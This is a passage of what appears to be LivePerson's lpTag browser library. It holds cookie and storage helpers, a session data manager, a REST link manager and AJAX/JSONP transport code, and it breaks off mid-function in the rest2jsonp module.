window.lpTag = window.lpTag || {};
lpTag.cookieMethods = lpTag.cookieMethods || function () {
  "use strict";

  function a() {
    return !!navigator.userAgent.match(/Chrome/);
  }
  function b() {
    var b = "lpTestCookie" + new Date().getTime(),
      d = "testValue";
    i({
      name: b,
      value: d
    });
    k = d === f(b);
    j(b);
    !k && a() && c();
    m = !1;
    return k;
  }
  function c() {
    var a = "lpTestCookie" + new Date().getTime(),
      b = "testValue";
    i({
      name: a,
      value: b,
      sameSite: "none",
      secure: !0
    });
    l = b === f(a);
    j(a, null, null, !0, "none");
    return l;
  }
  function d() {
    return k;
  }
  function e() {
    return l;
  }
  function f(a) {
    var b,
      c,
      d = "; ",
      e = "";
    if (m || k || l) {
      if ("string" != typeof a) return "";
      a = encodeURIComponent(a);
      try {
        c = d + document.cookie;
      } catch (f) {}
      b = c.split(d + a + "=");
      e = 1 == b.length ? "" : decodeURIComponent(b[1].split(";")[0]);
    }
    return e;
  }
  function g(a, b, c) {
    c = "number" == typeof c ? c : 2592e3;
    "object" == typeof a && (a.seconds = c);
    return h(a, b, c);
  }
  function h(a, b, c, d, e, f, g) {
    return i("object" == typeof a ? a : {
      name: a,
      value: b,
      seconds: c,
      path: d,
      domain: e,
      secure: f,
      sameSite: g
    });
  }
  function i(a) {
    var b,
      c,
      d = !1;
    if (m || k || l && a.secure && "none" === a.sameSite) {
      if ("string" != typeof a.name || "" === a.name) return !1;
      null !== a.value && void 0 !== a.value || (a.seconds = -1);
      if ("number" == typeof a.seconds) {
        c = new Date().getTime();
        b = new Date(c + 1e3 * a.seconds);
      }
      a.value = a.value ? encodeURIComponent(a.value) : "";
      try {
        document.cookie = [encodeURIComponent(a.name), "=", a.value, b ? "; expires=" + b.toUTCString() : "", a.path ? "; path=" + a.path : "", a.domain ? "; domain=" + a.domain : "", a.secure ? "; secure" : "", a.sameSite ? "; samesite=" + a.sameSite : ""].join("");
        d = !0;
      } catch (e) {}
    }
    return d;
  }
  function j(a, b, c, d, e) {
    return i({
      name: a,
      path: b,
      domain: c,
      secure: d,
      sameSite: e
    });
  }
  var k = !1,
    l = !1,
    m = !0;
  b();
  return {
    clearCookie: j,
    writeSessionCookie: h,
    writePersistentCookie: g,
    readCookie: f,
    isCookieEnabled: d,
    isChromeThirdPartyEnabled: e
  };
}();
window.lpTag = window.lpTag || {};
lpTag.storageMethods = lpTag.storageMethods || function () {
  "use strict";

  function a() {
    return l && m;
  }
  function b() {
    return l;
  }
  function c() {
    return m;
  }
  function d(a, c) {
    if (b()) {
      sessionStorage.setItem(a, c);
      return !0;
    }
  }
  function e(a) {
    return b() ? sessionStorage.getItem(a) || "" : void 0;
  }
  function f(a) {
    if (b() && e(a)) {
      sessionStorage.removeItem(a);
      return !0;
    }
    return !1;
  }
  function g(a, b) {
    if (c()) {
      localStorage.setItem(a, b);
      return !0;
    }
  }
  function h(a) {
    return c() ? localStorage.getItem(a) || "" : void 0;
  }
  function i(a) {
    if (c() && h(a)) {
      localStorage.removeItem(a);
      return !0;
    }
    return !1;
  }
  function j() {
    try {
      l = k(sessionStorage);
      m = k(localStorage);
    } catch (a) {}
  }
  function k(a) {
    var b = !1,
      c = "lpTestCase",
      d = "abc";
    try {
      if ("undefined" != typeof Storage) {
        a.setItem(c, d);
        b = a.getItem(c) === d;
        a.removeItem(c);
      }
    } catch (e) {}
    return b;
  }
  var l = !1,
    m = !1;
  j();
  return {
    isStorageEnabled: a,
    isSessionStorageEnabled: b,
    isLocalStorageEnabled: c,
    setSessionData: d,
    getSessionData: e,
    removeSessionData: f,
    setPersistentData: g,
    getPersistentData: h,
    removePersistentData: i
  };
}();
window.lpTag = window.lpTag || {};
lpTag.SessionDataManager = lpTag.SessionDataManager || function (a) {
  "use strict";

  function b(a) {
    lpTag && lpTag.log && lpTag.log(a, "ERROR", "SessionData");
  }
  function c(a, c, d) {
    var e = !1;
    if ("object" != typeof c) try {
      var f = d ? g.getPersistentSessionData(a) : g.getSessionData(a),
        h = "" !== f ? f.split(i) : [];
      h.push(c);
      f = h.join(i);
      e = d ? g.setPersistentData(a, f, d) : g.setSessionData(a, f);
    } catch (j) {
      b((d ? "appendToPersistentData " : "appendToSessionData ") + " failed, key: " + a);
    }
    return e;
  }
  function d(a, c, d) {
    var e = !1;
    if ("object" != typeof c) try {
      for (var f = d ? g.getPersistentSessionData(a) : g.getSessionData(a), h = "" !== f ? f.split(i) : [], j = [], k = 0; k < h.length; k++) h[k] !== c && j.push(h[k]);
      f = j.join(i);
      e = "" !== f ? d ? g.setPersistentData(a, f, d) : g.setSessionData(a, f) : d ? g.removePersistentData(a) : g.removeSessionData(a);
    } catch (l) {
      b((d ? "removePartialPersistentData " : "removePartialSessionData ") + " failed, key: " + a);
    }
    return e;
  }
  var e,
    f,
    g,
    h,
    i = "::",
    j = {},
    k = {},
    l = "object" == typeof a ? a : {};
  if (this !== window) {
    e = lpTag.storageMethods;
    f = lpTag.cookieMethods;
    h = !0 !== l.disableStorage && e.isStorageEnabled();
    g = this;
    this.readCookie = function (a) {
      return f.readCookie(a);
    };
    this.setSessionData = function (a, c) {
      c = this.stringifyValue(c);
      try {
        j[a] || (j[a] = a);
        h ? e.setSessionData(a, c) : f.writeSessionCookie(a, c);
      } catch (d) {
        b("Error in setSessionData, data: " + a);
      }
    };
    this.getSessionData = function (a) {
      try {
        return this.parseValue(h ? e.getSessionData(a) : f.readCookie(a));
      } catch (c) {
        b("Error in getSessionData, data: " + a);
      }
    };
    this.stringifyValue = function (a) {
      try {
        "object" == typeof a && (a = JSON.stringify(a));
      } catch (b) {}
      return a;
    };
    this.parseValue = function (a) {
      try {
        a = JSON.parse(a);
      } catch (b) {}
      return a;
    };
    this.getPersistentSessionData = function (a) {
      try {
        return this.parseValue(h ? e.getPersistentData(a) : f.readCookie(a));
      } catch (c) {
        b("Error in getPersistentSessionData, data: " + a);
      }
    };
    this.appendToSessionData = function (a, b) {
      c(a, b, !1);
    };
    this.appendToPersistentData = function (a, b, d) {
      c(a, b, !0, d);
    };
    this.removePartialPersistentData = function (a, b) {
      d(a, b, !0);
    };
    this.removeSessionData = function (a) {
      h ? e.removeSessionData(a) : f.clearCookie(a);
    };
    this.removePersistentData = function (a) {
      h ? e.removePersistentData(a) : f.clearCookie(a);
    };
    this.removePartialSessionData = function (a, b) {
      d(a, b, !1);
    };
    this.setPersistentData = function (a, c, d) {
      c = this.stringifyValue(c);
      try {
        k[a] || (k[a] = a);
        h ? e.setPersistentData(a, c) : f.writePersistentCookie(a, c, d);
      } catch (g) {
        b("Error in setPersistentData, data: " + a);
      }
    };
    this.clearPersistentData = function (a) {
      a = a || k;
      for (var c in a) try {
        h ? e.removePersistentData(a[c]) : f.clearCookie(a[c]);
      } catch (d) {
        b("Error in clearPersistentData, key: " + a[c]);
      }
    };
    this.clearSessionData = function (a) {
      a = a || j;
      for (var c in a) try {
        h ? e.removeSessionData(a[c]) : f.clearCookie(a[c]);
      } catch (d) {
        b("Error in SessionData in clearSessionData, key:" + a[c]);
      }
    };
  }
};
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.utils = lpTag.utils || {};
lpTag.utils.SessionDataAsyncWrapper = lpTag.utils.SessionDataAsyncWrapper || function (a) {
  "use strict";

  function b(a, b, c, d) {
    var e;
    if (o) j.getValue({
      key: a,
      app: p,
      appName: h,
      site: n,
      success: f(a, b, d),
      error: f(a, c, d),
      context: d,
      domain: k,
      firstParty: l
    });else {
      e = q.getSessionData(a);
      void 0 !== e ? g(b, e, d) : g(c, e, d);
    }
  }
  function c(a, b, c, d, e) {
    o ? j.setValue({
      key: a,
      app: p,
      appName: h,
      value: b,
      site: n,
      success: f(a, c, e),
      error: f(a, d, e),
      context: e,
      domain: k,
      firstParty: l
    }) : q.setSessionData(a, b) ? g(c, !0, e) : g(d, !1, e);
  }
  function d(a, b, c, d) {
    o ? j.setValue({
      key: a,
      app: p,
      appName: h,
      site: n,
      success: f(a, b, d),
      error: f(a, c, d),
      context: d,
      domain: k,
      expires: -1,
      firstParty: l
    }) : q.removeSessionData(a) ? g(b, !0, d) : g(c, !1, d);
  }
  function e() {
    return "function" == typeof lpTag.getEnv && lpTag.getEnv();
  }
  function f(a, b, c) {
    return function (a) {
      g(b, a, c);
    };
  }
  function g(a, b, c) {
    try {
      a && "function" == typeof a && a.call(c, b);
    } catch (d) {}
  }
  if (this === window) return null;
  a = a || {};
  var h,
    i,
    j,
    k,
    l,
    m = a.useSecureStorage,
    n = a.lpNumber,
    o = !1,
    p = a.app || "sessionDataAsyncWrapper";
  if (m) {
    h = a.appName;
    i = a.env || e();
    j = lpTag.taglets && lpTag.taglets.lpSecureStorage;
    k = a.secureStorageLocation;
    l = a.firstParty;
    o = !!(m && k && j && h && n);
    o && j.configure({
      conf: {
        site: n,
        env: i,
        app: p,
        url: k,
        firstParty: l
      }
    });
  }
  lpTag.SessionDataManager && (lpTag.utils.sessionDataManager = lpTag.utils.sessionDataManager || new lpTag.SessionDataManager(a));
  var q = lpTag.utils.sessionDataManager || null;
  return {
    setSessionData: c,
    getSessionData: b,
    removeSessionData: d,
    readCookie: lpTag.utils.sessionDataManager && lpTag.utils.sessionDataManager.readCookie,
    usingSecureStorage: o
  };
};
window.lpTag = window.lpTag || {};
lpTag.RelManager = lpTag.RelManager || function (a) {
  "use strict";

  function b(a, b) {
    var c;
    for (var d in b.data) if (b.data.hasOwnProperty(d)) {
      c = k.getURI(a, {
        type: d,
        id: b.data[d]
      });
      if (c) break;
    }
    return c;
  }
  function c(a) {
    if (a.indexOf("v=1") < 0) {
      a += a.indexOf("?") > -1 ? "&" : "?";
      a += "v=1";
    }
    a.indexOf("&NC=true") < 0 && (a += "&NC=true");
    return a;
  }
  function d(a) {
    j && a.toLowerCase().indexOf(".json") < 0 && (a.indexOf("?") > 0 ? a = a.replace("?", ".json?") : a += ".json");
    return a;
  }
  function e(a) {
    var b = "";
    for (var c in a) if (a.hasOwnProperty(c) && void 0 !== a[c] && null !== a[c]) if (a[c].constructor === Array) for (var d = 0; d < a[c].length; d++) b += "&" + encodeURIComponent(c) + "=" + encodeURIComponent(a[c][d]);else b += "&" + encodeURIComponent(c) + "=" + encodeURIComponent(a[c]);
    return b;
  }
  function f(a) {
    return "PUT" === a || "DELETE" === a ? "POST" : a || "GET";
  }
  function g(a) {
    var b = {
      AUTHORIZATION: "LivePerson appKey=" + n.appKey
    };
    n.accessToken && (b = {
      AUTHORIZATION: "Bearer " + n.accessToken
    });
    "PUT" !== a && "DELETE" !== a || (b["X-HTTP-Method-Override"] = a);
    return b;
  }
  function h(a, b) {
    a ? a = b.url : b && b.rel || !n.domain || !n.lpNumber ? b && b.rel && (a = k.getURI(b.rel, {
      type: b.type,
      id: b.id,
      needAuth: b.needAuth
    })) : a = "https://" + n.domain + "/api/account/" + n.lpNumber;
    if (a) {
      a = d(a);
      a = c(a);
    }
    return a;
  }
  function i(a, b, c) {
    lpTag && lpTag.utils && lpTag.utils.log && lpTag.utils.log(a, b, c);
  }
  var j = !0,
    k = this,
    l = null,
    m = "",
    n = {
      domain: "",
      lpNumber: "",
      appKey: "",
      accessToken: ""
    },
    o = ["xhr", "postmessage", "rest2jsonp"];
  if (this === window) {
    i("RelManager called without new", "DEBUG", "lpTag.RelManager");
    return new lpTag.RelManager(a);
  }
  a && a.constructor === Array && (o = a);
  this.clearData = function () {
    for (var a in n) n.hasOwnProperty(a) && (n[a] = "");
    l = null;
    m = "";
  };
  this.setData = function (a) {
    l = {};
    m = "";
    if (a) {
      for (var b in a) a.hasOwnProperty(b) && (n[b] = a[b]);
      "boolean" == typeof a.useJSON && (j = a.useJSON);
      a.transportOrder && (o = a.transportOrder);
    }
  };
  this.addRels = function (a, b) {
    var c, d, e, f;
    if (b) {
      f = this.extractRels(a);
      c = l[b.type] = l[b.type] || {};
      b.id && (c = c[b.id] = c[b.id] || {});
      for (var g in f) if (f.hasOwnProperty(g)) {
        d = f[g].rel || f[g]["@rel"];
        e = f[g].href || f[g]["@href"];
        c[d] = e;
      }
      if (b.data) {
        c.data = c.data || {};
        for (var h in b.data) b.data.hasOwnProperty(h) && (c.data[h] = b.data[h]);
      }
    }
  };
  this.removeRels = function (a) {
    var b = !1;
    if (a && void 0 !== a.type && l[a.type]) if (a.id) {
      if (l[a.type][a.id]) {
        l[a.type][a.id] = null;
        delete l[a.type][a.id];
        b = !0;
      }
    } else {
      l[a.type] = null;
      delete l[a.type];
      b = !0;
    }
    return b;
  };
  this.hasRel = function (a, b) {
    return !!this.getURI(a, b);
  };
  this.buildRequestObj = function (a, b) {
    var c = {
      url: "",
      method: "",
      headers: "",
      data: ""
    };
    n.accessToken = b || n.accessToken;
    c.url = h(a && a.url, a);
    a && a.queryParams && c.url && (c.url += e(a.queryParams));
    c.headers = g(a && a.requestType);
    c.method = f(a && a.requestType);
    c.transportOrder = a && a.transportOrder || o.slice(0);
    a && a.data && (c.data = a.data);
    return c.url ? c : null;
  };
  this.extractRels = function (a) {
    var b = [];
    for (var c in a) if (a.hasOwnProperty(c) && 0 === b.length) {
      if ("link" === c) {
        b = a[c].constructor === Array ? a[c] : [a[c]];
        break;
      }
      null !== a[c] && void 0 !== a[c] && "object" == typeof a[c] && a[c].constructor !== Array && (b = this.extractRels(a[c]));
    }
    return b;
  };
  this.getURI = function (a, c) {
    var d,
      e = null;
    if (c && l) {
      d = l[c.type];
      d && c.id && d[c.id] && (d = d[c.id]);
      if (d) {
        e = d[a] || null;
        !e && d.data && (e = b(a, d));
      }
    }
    return e;
  };
};
!function (a) {
  "use strict";

  function b(a, b, c) {
    lpTag && lpTag.log && lpTag.log(a, b, c);
  }
  function c(a, b, c) {
    return d.getPropertyFromObject(a, "body", {
      error: {
        message: b,
        time: new Date(),
        originalRequest: c
      }
    });
  }
  a.lpTag = a.lpTag || {};
  lpTag.taglets = lpTag.taglets || {};
  lpTag.utils = lpTag.utils || {};
  var d = lpTag.utils;
  d.runErrorCallback = function (a, b) {
    a && a.error && lpTag.utils.runCallback(a.error, a, b);
    b = null;
    a = null;
  };
  d.runSuccessCallback = function (a, b) {
    a && a.success && lpTag.utils.runCallback(a.success, a, b);
  };
  d.runCallback = function (a, c, d) {
    if (a && "function" == typeof a) try {
      a.call(c.context || c, d);
    } catch (e) {
      b("Failed to run callback, callback: " + a + " data: " + d, "error", "lpTag.utils.runCallback");
    }
  };
  d.validateAndExtendConfigs = function (a, b, c) {
    for (var e = 0; e < a.length; e++) {
      b = d.validateAndExtend(a[e], b);
      if (c && b.hasOwnProperty(a[e].prop)) break;
    }
    return b;
  };
  d.validateAndExtend = function (a, b) {
    var c,
      e = !0;
    b = b || {};
    if (a && d.validateType("object", a)) {
      c = d.getPropertyFromObject(a.obj, a.path, a.defaultValue);
      if (void 0 !== c && null !== c) {
        a.type && (e = d.validateType(a.type, c));
        e && (b[a.prop] = c);
      }
    }
    return b;
  };
  d.validateType = function (a, b) {
    var c = !1;
    c = "number" === a ? !isNaN(b) : "array" === a ? b.constructor === Array : typeof b === a;
    return c;
  };
  d.getPropertyFromObject = function (a, b, c) {
    var d,
      e = a;
    if ("string" == typeof b) {
      d = b.split(".");
      for (var f = 0; f < d.length; f++) {
        if (void 0 === e || null === e || void 0 === e[d[f]] || null === e[d[f]]) {
          e = void 0 !== c ? c : void 0;
          break;
        }
        e = e[d[f]];
      }
    }
    return e;
  };
  d.trim = function (a) {
    "string" == typeof a && "" !== a && (a = a.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, ""));
    return a;
  };
  d.getErrorData = function (a, b, d, e) {
    a = c(a, b, d);
    for (var f in e) e.hasOwnProperty(f) && !a[f] && (a[f] = e[f]);
    e = null;
    return a;
  };
  d.getResponseData = function (a, b, c, e) {
    var f,
      g,
      h,
      i = d.getPropertyFromObject(a, "body", {});
    if (b) {
      h = b.split(".");
      g = h.length;
      for (var j = 0; g > j; j++) {
        f = h[j];
        if (void 0 === i[f]) break;
        i = i[f];
      }
      if (!0 === c) {
        var k = {};
        k[h[g - 1]] = i;
        i = k;
      }
    }
    i = d.removeRels(i);
    for (var l in e) e.hasOwnProperty(l) && void 0 === i[l] && (i[l] = e[l]);
    return i;
  };
  d.removeRels = function (a) {
    for (var b in a) if (a.hasOwnProperty(b)) if ("link" == b) {
      a[b] = null;
      delete a[b];
    } else "object" == typeof a[b] && (a[b] = lpTag.utils.removeRels(a[b]));
    return a;
  };
  d.deleteProps = function (a, b) {
    for (var c = 0; c < b.length; c++) if (a.hasOwnProperty(b[c])) try {
      a[b[c]] = null;
      delete a[b[c]];
    } catch (d) {}
  };
  d.hasProperties = function (a) {
    var b = !1;
    if (a && "object" == typeof a) for (var c in a) if (a.hasOwnProperty(c)) {
      b = !0;
      break;
    }
    return b;
  };
}(window);
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.lpajax_utils = {
  _name: "lpajax_utils",
  _v: "0.1",
  each: function (a, b, c) {
    if (null != a) {
      var d = Array.prototype.forEach;
      if (d && a.forEach === d) a.forEach(b, c);else if (a.length === +a.length) {
        for (var e = 0, f = a.length; f > e; e++) if (e in a && b.call(c, a[e], e, a) === {}) return;
      } else for (var g in a) if (Object.prototype.hasOwnProperty.call(a, g) && b.call(c, a[g], g, a) === {}) return;
    }
  },
  extend: function (a) {
    this.each(Array.prototype.slice.call(arguments, 1), function (b) {
      for (var c in b) a[c] = b[c];
    });
    return a;
  },
  isEmptyObj: function (a) {
    for (var b in a) return !1;
    return !0;
  },
  init: function () {}
};
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.lpAjax = lpTag.taglets.lpAjax || function (a) {
  function b() {
    o = !0;
  }
  function c(b, c) {
    a.lpTag && lpTag.log && lpTag.log(b, c, l);
  }
  function d(a, b) {
    if (n[a]) c("Existing transport: " + a + " tried to register", p.DEBUG);else {
      n[a] = b;
      c("Added transport: " + a, p.DEBUG);
    }
  }
  function e(a) {
    o || b();
    var d,
      e = "unknown";
    try {
      d = h(a);
      if (d) {
        d.issueCall(a);
        return !0;
      }
      c("No Transport found to issueCall", p.ERROR);
      k(p.ERROR, a.error, {
        responseCode: 601,
        error: "No Transport found to issueCall, request: " + a.url,
        body: "ERROR"
      }, a.context);
    } catch (f) {
      d && d.getName && (e = d.getName());
      c("Transport - " + e + " - unknown exception while issueCall", p.ERROR);
      k(p.ERROR, a.error, {
        responseCode: 600,
        error: "Transport - " + e + " - unknown exception while issueCall: " + a.url + " e=" + f,
        body: "ERROR"
      }, a.context);
    }
  }
  function f(a) {
    o || b();
    for (var c in a) {
      var d = n[c];
      d && d.configure(a[c]);
    }
  }
  function g(a) {
    if (a && "object" == typeof a) {
      a.appName = m;
      a.ts = new Date().getTime();
      a.tags && a.tags.constructor === Array && a.tags.push({
        pageId: q
      });
      c(a, p.METRICS);
    }
  }
  function h(a) {
    for (var b, c = !1, d = -1, e = 0; e < a.transportOrder.length; e++) if (!c) {
      b = j({}, a);
      var f = n[b.transportOrder[e]];
      if (f && f.isValidRequest && f.isValidRequest(b)) {
        c = !0;
        d = e;
      }
    }
    return c ? n[b.transportOrder[d]] : null;
  }
  function i(a, b, c) {
    if (null != a) {
      var d = Array.prototype.forEach;
      if (d && a.forEach === d) a.forEach(b, c);else if (a.length === +a.length) {
        for (var e = 0, f = a.length; f > e; e++) if (e in a && b.call(c, a[e], e, a) === {}) return;
      } else for (var g in a) if (Object.prototype.hasOwnProperty.call(a, g) && b.call(c, a[g], g, a) === {}) return;
    }
  }
  function j(a) {
    i(Array.prototype.slice.call(arguments, 1), function (b) {
      for (var c in b) a[c] = b[c];
    });
    return a;
  }
  function k(a, b, d, e) {
    if ("function" == typeof b) try {
      b.call(e || null, d);
      b = null;
    } catch (f) {
      c("runCallback: Exception in execution of callback, type :" + a + " e=[" + f.message + "]", p.ERROR);
    } else c("runCallBack: No callback, of type :" + a, p.INFO);
  }
  var l = "lpAjax",
    m = "lpTransporter",
    n = {},
    o = !1,
    p = {
      ERROR: "ERROR",
      DEBUG: "DEBUG",
      INFO: "INFO",
      METRICS: "METRICS"
    },
    q = "lpT" + Math.floor(1e5 * Math.random()) + "_" + Math.floor(1e6 * Math.random());
  return {
    getVersion: function () {
      return "1.1.3";
    },
    getName: function () {
      return l;
    },
    init: b,
    publishMetrics: g,
    issueCall: e,
    configureTransports: f,
    addTransport: d
  };
}(window);
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.jsonp = lpTag.taglets.jsonp || function (a) {
  function b() {
    if (lpTag && lpTag.taglets && lpTag.taglets.lpAjax) try {
      lpTag.taglets.lpAjax.addTransport(W, X);
    } catch (a) {}
    x();
  }
  function c(a) {
    if (a) for (var c in a) H.hasOwnProperty(c) && a.hasOwnProperty(c) && (H[c] = a[c]);
    b();
  }
  function d(b) {
    var c = !1;
    if (J && b && b.url) {
      var d = !1;
      b.callbackName && "string" == typeof b.callbackName && (T[b.callbackName] || a[b.callbackName]) && (d = !0);
      var e;
      try {
        e = k(b);
      } catch (f) {
        E("Could not evaluate the length  of the request, e=" + f, I.ERROR, "isValidRequest");
        c = !1;
      }
      void 0 !== e && K > e && !d && (c = !0);
    }
    return c;
  }
  function e(a) {
    var b;
    if (!d(a)) {
      E("URL request was too long or static callback name already exists, url: " + b, I.ERROR, "issueCall");
      s();
      a && a.error && B(I.ERROR, a.error, i(600, "Transport - JSONP - unable to run request: " + a.url), a.context);
      return !1;
    }
    a = g(a);
    a.callbackName && "string" == typeof a.callbackName ? a.retries = 0 : a.callbackName = L + h();
    b = a.url + (a.url.indexOf("?") > -1 ? "&" : "?") + a.callback + "=" + a.callbackName;
    a.data && (b += "&" + l(a.data));
    a.query && (b += "&" + l(a.query));
    a.callUrl = b;
    if (n(a)) {
      D(a);
      o();
    } else E("URL request was too long and was not sent, url: " + b, I.ERROR, "issueCall");
    return !0;
  }
  function f() {
    var a = {};
    for (var b in H) H.hasOwnProperty(b) && (a[b] = H[b]);
    return a;
  }
  function g(a) {
    "string" == typeof a && (a = {
      url: a
    });
    if (!a.url) return !1;
    a.encoding = a.encoding || H.encoding;
    a.callback = a.callback || H.callback;
    a.retries = "number" == typeof a.retries ? a.retries : H.retries;
    a.timeout = a.timeout ? a.timeout : H.timeout;
    return a;
  }
  function h(a) {
    var b,
      c = 99999,
      d = "x";
    b = a ? c + d + c : Math.round(Math.random() * c) + d + Math.round(Math.random() * c);
    return b;
  }
  function i(a, b) {
    return {
      statusCode: a,
      responseCode: a,
      error: b,
      body: "ERROR"
    };
  }
  function j() {
    return "scr" + Math.round(999999999 * Math.random()) + "_" + Math.round(999999999 * Math.random());
  }
  function k(a) {
    var b = U;
    a.callbackName && "string" == typeof a.callbackName && (b = a.callbackName.length);
    return 4 + (a.callback || H.callback).length + a.url.length + b + l(a.data).length + l(a.query).length;
  }
  function l(a) {
    var b = "";
    if ("string" == typeof a) b += a;else {
      var c = !0;
      for (var d in a) {
        var e;
        "object" == typeof a[d] ? e = m(a[d]) : "function" != typeof a[d] && (e = a[d]);
        if (void 0 !== e) {
          c || (b += "&");
          b += encodeURIComponent(d) + "=" + encodeURIComponent(e);
          c = !1;
        }
      }
    }
    return b;
  }
  function m(a) {
    var b;
    if ("function" == typeof Array.prototype.toJSON) {
      var c = Array.prototype.toJSON;
      delete Array.prototype.toJSON;
      try {
        b = JSON.stringify(a);
      } catch (d) {
        Array.prototype.toJSON = c;
        throw d;
      }
      Array.prototype.toJSON = c;
    } else b = JSON.stringify(a);
    return b;
  }
  function n(b) {
    var c,
      d = !1,
      e = new RegExp(/(http{1}s{0,1}?:\/\/)([^\/\?]+)(\/?)/gi);
    c = 0 === b.callUrl.indexOf("http") ? e.exec(b.callUrl) : e.exec(a.location.href);
    if (c && c.length >= 3 && "" !== c[2]) {
      var f = c[2].toLowerCase();
      b.domainMatch = f;
      M[f] = M[f] || [];
      M[f].inFlight = M[f].inFlight || 0;
      M[f].push(b);
      d = !0;
      O += 1;
      E("buffered URL: " + b.callUrl, I.DEBUG, "lpTag.taglets.jsonp.bufferRequest");
    } else E("NO MATCH for URL: " + b.callUrl, I.ERROR, "lpTag.taglets.jsonp.bufferRequest");
    return d;
  }
  function o() {
    var a;
    for (var b in M) if (M.hasOwnProperty(b)) {
      a = M[b];
      for (var c = !1; !c && a.inFlight < 6 && a.length > 0;) {
        var d = a.shift();
        if (d) {
          E("Sent URL: " + d.callUrl, I.DEBUG, "lpTag.taglets.jsonp.sendRequests");
          d.scriptId = q(d.callUrl, d.encoding, d.callbackName);
          d.startTime = new Date().getTime();
          r(b, d.callbackName, d.timeout);
          O -= 1;
        } else c = !0;
      }
    }
    a = null;
  }
  function p() {
    clearTimeout(F);
    F = null;
    var b = new Date();
    for (var c in T) if (T.hasOwnProperty(c) && T[c].launchTime) {
      var d = b - T[c].launchTime;
      (T[c].loadTime || d > T[c].timeout) && a[c].apply(null, [i(408, {
        message: "Request timed out",
        name: "timeout"
      }), !0]);
    }
    P > 0 && (F = setTimeout(p, 1e3));
  }
  function q(b, c, d) {
    var e = j(),
      f = document.createElement("script");
    f.setAttribute("type", "text/javascript");
    f.setAttribute("charset", c);
    f.onload = function () {
      T[d] && (T[d].loadTime = new Date());
      this.onload = this.onerror = this.onreadystatechange = null;
    };
    a.addEventListener ? f.onerror = function () {
      T[d] && (T[d].loadTime = new Date());
      this.onload = this.onerror = this.onreadystatechange = null;
    } : f.onreadystatechange = function () {
      if (this.readyState && ("loaded" === this.readyState || "complete" === this.readyState)) {
        T[d] && (T[d].loadTime = new Date());
        this.onload = this.onerror = this.onreadystatechange = null;
      }
    };
    f.setAttribute("src", b);
    f.setAttribute("id", e);
    document.getElementsByTagName("head")[0].appendChild(f);
    F || (F = setTimeout(p, 1e3));
    f = null;
    return e;
  }
  function r(a, b, c) {
    M[a].inFlight = M[a].inFlight + 1;
    T[b] = {
      launchTime: new Date(),
      timeout: c
    };
    P += 1;
    N += 1;
  }
  function s() {
    Q += 1;
  }
  function t(a) {
    var b = document.getElementById(a);
    if (b) try {
      b.parentNode.removeChild(b);
    } catch (c) {
      E("error when removing script", I.ERROR, "removeScript");
    }
  }
  function u(a) {
    M[a].inFlight = M[a].inFlight - 1;
    P -= 1;
  }
  function v(a, b, c) {
    y(b.startTime, b.url, c);
    t(b.scriptId);
    u(b.domainMatch);
    C(b.callbackName, c);
    if (c) {
      if (b.callbackName) {
        b.callbackName = null;
        delete b.callbackName;
      }
      z(a, b);
    } else {
      A(b);
      B("callback", b.success, a, b.context);
      b = null;
      o();
    }
  }
  function w() {
    var a;
    if (lpTag.taglets.lpAjax && lpTag.taglets.lpAjax.publishMetrics && S.length > 0) {
      a = {
        tags: [{
          transport: W
        }],
        metrics: S
      };
      lpTag.taglets.lpAjax.publishMetrics(a);
      S.length = 0;
    }
    x();
  }
  function x() {
    G && clearTimeout(G);
    G = setTimeout(w, H.metricsTimeout);
  }
  function y(a, b, c) {
    var d, e;
    if (a) {
      e = new Date().getTime();
      d = e - a;
      S.push({
        rd: d,
        ts: a,
        url: b,
        method: "GET",
        statusCode: c ? 400 : 200
      });
      S.length >= H.metricsCount && w();
    }
  }
  function z(a, b) {
    R += 1;
    if (b.retries > 0) {
      b.retries = b.retries - 1;
      e(b);
    } else {
      A(b);
      B(I.ERROR, b.error, a || i(408, {
        id: 408,
        name: "TIMEOUT",
        message: "Request has timed out on all retries"
      }), b.context);
      b = null;
      o();
    }
  }
  function A(a) {
    for (var b = ["callUrl", "retries", "id", "requestTimeout", "type", "encoding", "launchTime", "callbackName", "domainMatch", "startTime"], c = 0; c < b.length; c++) if (a.hasOwnProperty(b[c])) {
      a[b[c]] = null;
      delete a[b[c]];
    }
  }
  function B(a, b, c, d) {
    if ("function" == typeof b) try {
      b.call(d || null, c);
      b = null;
    } catch (e) {
      E("Exception in execution of callback, type :" + a + " e=[" + e.message + "]", I.ERROR, "runCallback");
    } else E("No callback, of type :" + a, I.INFO, "runCallback");
  }
  function C(b, c) {
    T[b] = null;
    delete T[b];
    if (!0 === c) a[b] = function () {
      a[b] = null;
      try {
        delete a[b];
      } catch (c) {}
    };else {
      a[b] = null;
      try {
        delete a[b];
      } catch (d) {}
    }
  }
  function D(b) {
    if (T[b.callbackName]) {
      s();
      z(i(409, {
        message: "This callbackName is already in a pending request and can't be serviced",
        id: 409,
        name: "CONFLICT"
      }), b);
    } else a[b.callbackName] = function (a, c) {
      v(a, b, c);
    };
  }
  function E(b, c, d) {
    if (a.lpTag && lpTag.log) {
      "string" == typeof b && d && (b = d + ": " + b);
      lpTag.log(b, c, W);
    }
  }
  var F,
    G,
    H = {
      callback: "cb",
      encoding: "UTF-8",
      timeout: 1e4,
      retries: 2,
      metricsCount: 100,
      metricsTimeout: 6e4
    },
    I = {
      ERROR: "ERROR",
      DEBUG: "DEBUG",
      INFO: "INFO"
    },
    J = !0,
    K = 2083,
    L = "lpCb",
    M = {},
    N = 0,
    O = 0,
    P = 0,
    Q = 0,
    R = 0,
    S = [],
    T = {},
    U = h(!0).length,
    V = "1.1.7",
    W = "jsonp",
    X = {
      init: b,
      configure: c,
      issueCall: e,
      isValidRequest: d,
      getVersion: function () {
        return V;
      },
      getName: function () {
        return W;
      },
      getDefaults: f,
      inspect: function () {
        return {
          name: W,
          version: V,
          callsMade: N,
          errorsFound: R,
          pending: P,
          buffered: O,
          refused: Q,
          defaults: f()
        };
      }
    };
  b();
  return X;
}(window);
window.lpTag = window.lpTag || {};
lpTag.taglets = lpTag.taglets || {};
lpTag.taglets.rest2jsonp = lpTag.taglets.rest2jsonp || function () {
  function a() {
    if (lpTag && lpTag.taglets && lpTag.taglets.lpAjax) try {
